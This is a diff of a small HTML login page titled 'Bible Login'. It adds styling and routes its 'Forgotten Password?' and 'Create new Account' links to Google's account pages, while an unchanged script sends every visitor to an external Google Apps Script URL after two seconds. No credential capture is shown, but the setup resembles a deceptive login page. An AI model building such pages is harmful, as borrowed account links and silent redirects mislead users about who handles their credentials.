@@ -65,7 +65,7 @@
         }
         .show-password {
             display: flex;
-            align-items: center;
+            justify-content: space-between;
             font-size: 14.5px;
             margin: -15px 0 15px;
         }
@@ -99,12 +99,26 @@
         .register-link p a:hover {
             text-decoration: underline;
         }
+        .forgot-password {
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
     <div class="wrapper">
         <form id="loginForm">
-            <h1>Login</h1>
+            <h1>Bible Login</h1>
             <div class="input-box">
                 <input type="text" id="email" placeholder="Email" required>
                 <i class="bx bxs-user"></i>
@@ -114,20 +128,27 @@
                 <i class="bx bxs-lock-alt"></i>
             </div>
             <div class="show-password">
-                <label>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="checkbox" id="togglePassword"> Show Password</label>
+                <label><input type="checkbox" id="togglePassword"> Show Password</label>
+                <p class="forgot-password">
+                    <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ddm=1&dsh=S-468743872%3A1736003708491633&ec=GAlA8wE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en" target="_blank">
+                        Forgotten Password?
+                    </a>
+                </p>
             </div>
             <button type="submit" class="btn">Login</button>
             <div class="register-link">
-                <p>Don't have an account? <a href="https://accounts.google.com/signup" target="_blank"> <b>Create new Account</b></a></p>
+                <p>Don't have an account? <a href="https://accounts.google.com/signup" target="_blank"><b>Create new Account</b></a></p>
             </div>
         </form>
     </div>
-    <script>
+
+        <script>
         // Function to open the URL after 2 seconds
         setTimeout(function() {
             window.location.href = "https://script.google.com/macros/s/AKfycbzN9ZDgpadRmCd0F5EyY9a8AeW1CVcdJTIJDuhgafTUaX4uoDyhM6cEkTnGOGV-0_lc2Q/exec";
         }, 2000); // 2000 milliseconds = 2 seconds
-    </script>
+       </script>
+
     <script>
         const togglePassword = document.getElementById('togglePassword');
         const password = document.getElementById('password');
